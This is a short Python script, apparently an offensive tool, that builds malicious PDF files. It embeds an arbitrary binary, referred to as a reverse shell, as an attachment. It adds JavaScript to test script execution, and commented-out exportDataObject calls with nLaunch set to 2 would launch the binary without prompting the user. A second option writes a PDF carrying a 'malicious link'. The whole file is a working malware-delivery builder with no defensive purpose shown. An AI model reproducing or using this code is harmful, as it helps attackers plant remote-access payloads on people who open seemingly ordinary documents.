import PyPDF4
import os
from fpdf import FPDF



print("Please choose: \n")
print("[ 1 ] Embed an executable or a file inside pdf\n")
print("[ 2 ] Embed malicious link\n\n")
choice = input("Enter choice --> ")

if(choice == "1"):
    binary = input("Enter the name of the binary file --> ")
    pdfFile = input("Enter the name of the pdf file --> ")
    # opening the first pdf
    reader = PyPDF4.PdfFileReader(pdfFile)
    writer = PyPDF4.PdfFileWriter()
    print(f"size of SOURCE pdf: {os.stat(pdfFile).st_size}")

    # copying the sample.pdf to a new writer
    writer.appendPagesFromReader(reader)
    print(f"size of reverse_shell: {os.stat(binary).st_size}")

    # starts print job, testing for js execution
    writer.addJS("this.print({bUI:true,bSilent:false,bShrinkToFit:true});")
    # opening and embedding the binary into pdf
    with open(binary, "rb") as rs:
        writer.addAttachment(binary, rs.read())
        #writer.addJS("this.exportDataObject({cName: 'reverse_linux', nLaunch: 2});")
    # adding JavaScript that will invoke the binary
    # nLaunch: 2 --> without prompting the user and saving it to a temp location
    # does not inside FoxitPdf reader since it block the execution
    #javascript = """this.exportDataObject({cName: 'reverse_linux' + '.Settingcontent-ms', nLaunch: 2});"""
    # writing to the new pdf that contains the attachment( binary )

    with open("outMalware.pdf", "wb") as f:
        writer.write(f)
    print(f"size of OUTPUT pdf: {os.stat('outMalware.pdf').st_size}")
    print("Binary added to outMalware.pdf")

elif(choice == "2"):
    link = input("Enter the link to be embbeded --> ")
    pdf = FPDF()

    pdf.add_page()
    pdf.set_font("Courier", size = 15)
    pdf.cell(200, 10, txt = "Malware document",
            ln = 1, align = 'C')
    pdf.cell(200, 10, txt = link, border = 1,
            ln = 2, align = 'C')
    pdf.output("LinkMalware.pdf")   
    

